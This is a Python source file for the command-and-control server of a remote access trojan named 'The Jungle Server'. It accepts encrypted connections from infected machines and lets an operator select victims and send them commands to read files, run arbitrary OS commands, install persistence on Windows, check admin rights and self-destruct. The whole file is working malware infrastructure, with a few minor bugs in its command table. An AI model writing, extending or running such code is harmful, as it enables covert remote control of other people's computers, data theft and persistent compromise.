#!/usr/bin/env python

from core.crypto import *
import socket
import time
import sys
import threading
import random
import string
import argparse
from core.asciiart import get_ascii, get_banner

HELP = '''
                             (Client Commands)
                You have asked for help, here are your commands
----------------------------------------------------------------------------------------------------------------------
        cat <file>          | Read a file
        execute <cmd>       | Execute a os command
        ls                  | List contents of a directory
        pwd                 | Print work directory
        implant             | Runs persistence (currently only on Windows)
        selfdestruct        | Kill rat on remote computer.
        isadmin             | Returns whether current user is admin
----------------------------------------------------------------------------------------------------------------------
                            (Server Commands)
----------------------------------------------------------------------------------------------------------------------
        client <id>         : server.select_client
        clientls            : server.list_clients
        help                : server.print_help
        kill <id>           : server.kill_client
        quit                : server.quit_server
        apoc(olypse)        : server.apocolypse
----------------------------------------------------------------------------------------------------------------------
'''

CLIENT_COMMANDS = [ 'execute', 'cat', 'ls', 'cd', 'implant', 'pwd', 'isadmin', 'scan']

# Determine platform of system
if sys.platform.startswith('win'):
    PLATFORM = 'Windows'
elif sys.platform.startswith('linux'):
    PLATFORM = 'Linux'
elif sys.platform.startswith('darwin'):
    PLATFORM = 'Macintosh'
else:
    print("Platform is not supported")
    sys.exit(1)

class ping(threading.Thread):
    def __init__(self, server):
        super(ping, self).__init__() # This is for threading.
        self.server = server
        
    def run(self):
        while True:
            time.sleep(10)
            try:
                for id, client in self.server.clients.items():
                    #enc_msg = encrypt("ping", client.gen_key)
                    try:
                        self.server.send_client("ping", client=client)
                        self.server.recv_client(client)
                        pass
                    except:
                        print("Client {} disconnected".format(id))
                        self.server.remove_client(id)
                        self.server.current_client = None
                        pass
            except RuntimeError:
                print("Something bad happened")
                pass
            

class Server(threading.Thread):
    clients         = {}
    client_count    = 1
    current_client  = None
    
    def __init__(self, port):
        super(Server, self).__init__()

        # Generate the DH key so we have a public/private key combo.
        self.server_dhkey = DiffieHellman()

        # Setup socket and start listening.
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(('0.0.0.0', port))
        self.s.listen(5)

    def run(self):
        while True:
            # When connection received
            try:
                conn, addr  = self.s.accept()
                print("\nClient {} connected\n".format(addr))
                client_id   = self.client_count
            except:
                print("\nClient {} disconnected\n".format(addr))
                pass
            # Exchange public keys to make a ClientConnection, and communicate securely.
            client_pubkey, gen_key = self.exchange_key(conn)

            client = ClientConnection(conn, addr, client_pubkey, gen_key, client_id)

            # Store client object in a list for later referencing, increment to next empty client.
            self.clients[client_id] = client
            self.client_count += 1

    def exchange_key(self, conn):
        ## Negotiate key by exchanging pubkey of client/server

        # Generate get public key of server and send it to client.        
        send_key = self.server_dhkey.publicKey
        conn.send(str(send_key).encode('utf-8'))

        # Receive public key from client.
        client_pubkey = conn.recv(4096).decode('utf-8')
        client_pubkey = int(client_pubkey)

        # Generate a key to use for communication
        self.server_dhkey.genKey(client_pubkey)
        gen_key = self.server_dhkey.getKey()

        # Return both the clients public key and the generated key to communicate.
        return client_pubkey, gen_key

    ## Simple send client method that encrypts with the generated key
    def send_client(self, message, client=""):
        try:
            # Encrypt the message with the clients generated key
            # Send message to client
            if(client == ""):
                current_client = self.current_client
            elif(client):
                current_client = client
            else:
                print("Error, client not selected.")

            enc_msg = encrypt(message, current_client.gen_key)
            try:
                current_client.conn.send(enc_msg)
            except:
                pass
        except:
            print("Error, can not send message")

    def recv_client(self, client):
        #try:
            # Header is a pre sent message to tell how big the actual message is
            header = client.conn.recv(1024)
            header = int(header)
            # recv_msg is the actual message received of size header
            recv_msg = client.conn.recv(int(header))

            dec_msg = decrypt(recv_msg, client.gen_key)
            if(dec_msg == "ping"):
                pass
            else:
                print("From Client:\n{}".format(dec_msg))
        #except:
            #print("Error, can not receive clients message.")
            #pass

    def print_help(self, _):
        print(HELP)

    ## Client Methods ##
    def select_client(self, client_id):
        try:
            self.current_client = self.clients[int(client_id)]
            print("Client {} selected.".format(client_id))
        except (KeyError, ValueError):
            print("Error, invalid client ID")

    def list_clients(self, _):
        print("ID | Client Addr\n-------------------")
        for k, v in self.clients.items():
            print("{:>2} | {}".format(k, v.addr[0]))

    def remove_client(self, id):
        print("Client {} removed\n".format(id))
        return self.clients.pop(id, None)

    def kill_client(self, _):
        self.send_client("kill")
        self.current_client.conn.close()
        self.remove_client(self.current_client.uid)
        self.current_client = None

    def apoc(self, _):
        for client in self.clients:
            self.current_client = client
            self.send_client("apoc")
            self.current_client.conn.close()
            self.remove_client(self.current_client.uid)
            self.current_client = None

class ClientConnection():
    def __init__(self, conn, addr, pubkey, gen_key, uid):
        self.conn    = conn
        self.addr    = addr
        self.pubkey  = pubkey
        self.gen_key = gen_key
        self.uid     = uid
        
def parset():
    parser = argparse.ArgumentParser(description="The Jungle Server")
    parser.add_argument('-n', help='y or (n).', default='n', type=str)
    return parser

def main():
    parser = parset()
    args = vars(parser.parse_args())
    decisions = args['n']
    BANNER = '''
    {}
    {}
    '''.format(get_banner(), get_ascii(nude=decisions))

    print(BANNER)

    port = 50000

    server = Server(port)
    server.setDaemon(True)
    server.start() # Start is used for threading

    print("Server is listening on {} for clients".format(port))

    pingme = ping(server)
    pingme.start()
    print("Ping is running")
    
    # Main Loop

    while True:
        try:
            server_commands = {
            'client' : server.select_client,
            'clientls' : server.list_clients,
            'help' : server.print_help,
            'kill' : server.kill_client,
            'quit' : 'server.quit_server',
            'apoc' : 'server.apocolypse' # Difference between this and quit is quit will leave clients alive, 
                                               # while this will destroy them.
            }
            # Simple setup to get client id
            if server.current_client:
                clientid = server.current_client.uid
            else:
                clientid = '!'

            ## Start asking for user input
            
            prompt = input('\n[{}] Jungle> '.format(clientid))
            

            if not prompt:
                continue

            cmd, _, action = prompt.partition(' ')

            if cmd in server_commands:
                server_commands[cmd](action)

            elif cmd in CLIENT_COMMANDS:
                if clientid == '!':
                    print("Client not selected")
                    continue

                print("Running command {}".format(cmd))
                server.send_client(prompt)
                server.recv_client(server.current_client)
            else:
                print("Not a valid command, maybe ask for help?")
        except ConnectionResetError:
            print("Client {} disconnected".format(server.current_client.uid))
            server.current_client.conn.close()
            server.remove_client(server.current_client.uid)
            server.current_client = None
            pass

if __name__ == '__main__':
    main()